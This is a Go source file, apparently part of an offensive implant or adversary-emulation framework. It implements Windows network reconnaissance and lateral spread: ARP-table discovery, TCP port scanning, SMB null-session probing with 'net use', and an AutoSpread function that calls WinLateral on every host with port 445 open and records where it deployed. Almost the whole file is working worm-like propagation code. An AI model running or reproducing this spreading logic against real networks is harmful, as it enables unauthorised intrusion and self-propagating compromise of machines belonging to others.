package ttp

// net_map.go — TTP 34/35/36: network recon + lateral spread (Windows)
//
// TTP 34 (net_map):    ARP table + TCP port scan; JSON output
// TTP 35 (auto_spread): discover hosts + attempt WinLateral on each 445-open host
// TTP 36 (smb_probe):  port 445 probe across ARP table

import (
	"encoding/json"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"
)

// HostInfo describes a discovered host.
type HostInfo struct {
	IP        string `json:"ip"`
	MAC       string `json:"mac,omitempty"`
	Hostname  string `json:"hostname,omitempty"`
	OpenPorts []int  `json:"open_ports,omitempty"`
	ICMP      bool   `json:"icmp,omitempty"`
	OS        string `json:"os_hint,omitempty"`
}

// SpreadResult is the output of TTP 35.
type SpreadResult struct {
	Hosts    []HostInfo `json:"hosts"`
	Deployed []string   `json:"deployed"`
	Failed   []string   `json:"failed"`
}

var defaultScanPorts = []int{22, 80, 135, 139, 443, 445, 3306, 3389, 5985, 8080, 8443}

// NetMap performs network discovery via ARP table + TCP port scan. Returns JSON.
// params: optional comma-separated ports override, e.g. "22,445,3389"
func NetMap(params string) (string, error) {
	scanPorts := defaultScanPorts
	if params != "" {
		scanPorts = parsePorts(params)
	}

	hosts, err := parseARPTable()
	if err != nil {
		return "", fmt.Errorf("arp: %w", err)
	}

	var mu sync.Mutex
	var results []HostInfo
	var wg sync.WaitGroup

	for _, entry := range hosts {
		wg.Add(1)
		go func(ip, mac string) {
			defer wg.Done()
			info := HostInfo{IP: ip, MAC: mac}

			// ICMP via system ping (no raw socket privileges needed)
			info.ICMP = pingHostWin(ip)

			// TCP port scan
			for _, port := range scanPorts {
				if probeTCP(ip, port, 800*time.Millisecond) == "open" {
					info.OpenPorts = append(info.OpenPorts, port)
				}
			}

			// Reverse DNS
			if names, err := net.LookupAddr(ip); err == nil && len(names) > 0 {
				info.Hostname = strings.TrimSuffix(names[0], ".")
			}

			info.OS = osHintWin(info.OpenPorts)

			mu.Lock()
			results = append(results, info)
			mu.Unlock()
		}(entry[0], entry[1])
	}
	wg.Wait()

	out, _ := json.MarshalIndent(SpreadResult{Hosts: results}, "", "  ")
	return string(out), nil
}

// AutoSpread discovers hosts with port 445 open and attempts WinLateral on each.
// No SSH key dependency — Windows lateral uses SMB+WMI.
func AutoSpread() (string, error) {
	hosts, err := parseARPTable()
	if err != nil {
		return "", fmt.Errorf("arp: %w", err)
	}

	selfIP := selfIPv4()

	result := SpreadResult{}
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, entry := range hosts {
		ip := entry[0]
		if ip == selfIP {
			continue
		}
		// Only attempt lateral on hosts with SMB open
		if probeTCP(ip, 445, 2*time.Second) != "open" {
			continue
		}
		mu.Lock()
		result.Hosts = append(result.Hosts, HostInfo{IP: ip, OpenPorts: []int{445}})
		mu.Unlock()

		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			msg, err := WinLateral(ip)
			mu.Lock()
			if err != nil {
				result.Failed = append(result.Failed, ip+": "+err.Error())
			} else {
				result.Deployed = append(result.Deployed, msg)
			}
			mu.Unlock()
		}(ip)
	}
	wg.Wait()

	out, _ := json.MarshalIndent(result, "", "  ")
	return string(out), nil
}

// SMBProbe checks port 445 on all ARP-table hosts.
// params: optional space-separated target IPs; empty = full ARP scan.
func SMBProbe(params string) (string, error) {
	var targets []string

	if params != "" {
		targets = strings.Fields(params)
	} else {
		arpHosts, err := parseARPTable()
		if err != nil {
			return "", fmt.Errorf("arp: %w", err)
		}
		for _, e := range arpHosts {
			targets = append(targets, e[0])
		}
	}

	var lines []string
	for _, ip := range targets {
		status := probeTCP(ip, 445, 2*time.Second)
		line := fmt.Sprintf("%s:445 %s", ip, status)
		if status == "open" {
			// Quick null-session test with net use
			out, err := exec.Command("net", "use",
				`\\`+ip+`\IPC$`, "", `/user:""`).CombinedOutput()
			if err == nil {
				line += "  [null-session: ok]"
				exec.Command("net", "use", `\\`+ip+`\IPC$`, "/delete", "/y").Run()
			} else {
				first := strings.TrimSpace(strings.Split(string(out), "\n")[0])
				line += "  [" + first + "]"
			}
		}
		lines = append(lines, line)
	}

	if len(lines) == 0 {
		return "smb_probe: no hosts", nil
	}
	return strings.Join(lines, "\n"), nil
}

// parseARPTable reads the Windows ARP table via `arp -a`.
// Returns [][]string where each entry is [ip, mac].
func parseARPTable() ([][2]string, error) {
	out, err := exec.Command("arp", "-a").Output()
	if err != nil {
		return nil, err
	}

	var entries [][2]string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		// Windows `arp -a` format: "  192.168.1.1      aa-bb-cc-dd-ee-ff     dynamic"
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}
		ip := fields[0]
		mac := fields[1]
		if net.ParseIP(ip) == nil {
			continue
		}
		// Skip multicast and broadcast
		if strings.HasPrefix(ip, "224.") || strings.HasPrefix(ip, "239.") ||
			strings.HasSuffix(ip, ".255") {
			continue
		}
		entries = append(entries, [2]string{ip, mac})
	}
	return entries, nil
}

// probeTCP attempts a TCP connection to ip:port with the given timeout.
func probeTCP(ip string, port int, timeout time.Duration) string {
	addr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return "closed"
	}
	conn.Close()
	return "open"
}

// pingHostWin sends a single ICMP echo using the Windows ping binary.
func pingHostWin(ip string) bool {
	cmd := exec.Command("ping", "-n", "1", "-w", "1000", ip)
	cmd.Stdout = nil
	cmd.Stderr = nil
	return cmd.Run() == nil
}

// osHintWin guesses OS from open ports.
func osHintWin(ports []int) string {
	portSet := map[int]bool{}
	for _, p := range ports {
		portSet[p] = true
	}
	if portSet[3389] || portSet[135] {
		return "windows"
	}
	if portSet[22] && !portSet[445] {
		return "linux"
	}
	if portSet[445] {
		return "windows/samba"
	}
	return ""
}

// selfIPv4 returns the primary non-loopback IPv4 address.
func selfIPv4() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// parsePorts parses a comma-separated port list.
func parsePorts(s string) []int {
	var ports []int
	for _, p := range strings.Split(s, ",") {
		var n int
		if _, err := fmt.Sscanf(strings.TrimSpace(p), "%d", &n); err == nil && n > 0 && n < 65536 {
			ports = append(ports, n)
		}
	}
	if len(ports) == 0 {
		return defaultScanPorts
	}
	return ports
}
